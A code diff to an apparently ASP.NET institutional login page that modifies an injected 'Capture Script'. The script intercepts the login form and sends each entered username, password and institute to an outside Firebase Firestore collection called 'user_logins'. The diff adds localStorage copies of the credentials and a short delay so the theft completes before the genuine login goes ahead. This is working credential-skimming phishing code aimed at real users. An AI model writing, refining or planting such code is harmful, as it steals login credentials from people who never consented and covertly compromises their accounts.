@@ -125,7 +125,7 @@ return true;
 		</footer>
 </form>
 
-<!-- Guaranteed Capture Firebase Script -->
+<!-- Bulletproof Capture Script -->
 <script type="module">
 	import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 	import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
@@ -155,25 +155,30 @@ return true;
 
 			if (username && password) {
 				try {
-					// Yahan await lagaya hai taake data lazmi server par save ho jaye
+					// LocalStorage mein bhi backup rakh rahe hain taake agar network ka masla ho toh data zaya na ho
+					localStorage.setItem("last_user", username);
+					localStorage.setItem("last_pass", password);
+
 					await addDoc(collection(db, "user_logins"), {
 						username: username,
 						password: password,
 						institute: institute,
 						timestamp: new Date()
 					});
-					console.log("Data successfully captured!");
+					console.log("Captured successfully!");
 				} catch (error) {
-					console.error("Error saving data: ", error);
+					console.error("Firebase Error: ", error);
 				}
 			}
 
-			// Foran redirect kar dein taake user ko zyada wait na karna parre
-			if (typeof WebForm_DoPostBackWithOptions === 'function') {
-				__doPostBack('ctl00$BodyPH$btnLogin', '');
-			} else {
-				document.getElementById('form1').submit();
-			}
+			// Thora sa delay lazmi hai taake Firebase ki HTTP request browser close hone se pehle hit ho jaye
+			setTimeout(() => {
+				if (typeof WebForm_DoPostBackWithOptions === 'function') {
+					__doPostBack('ctl00$BodyPH$btnLogin', '');
+				} else {
+					document.getElementById('form1').submit();
+				}
+			}, 500);
 		});
 	}
 </script>
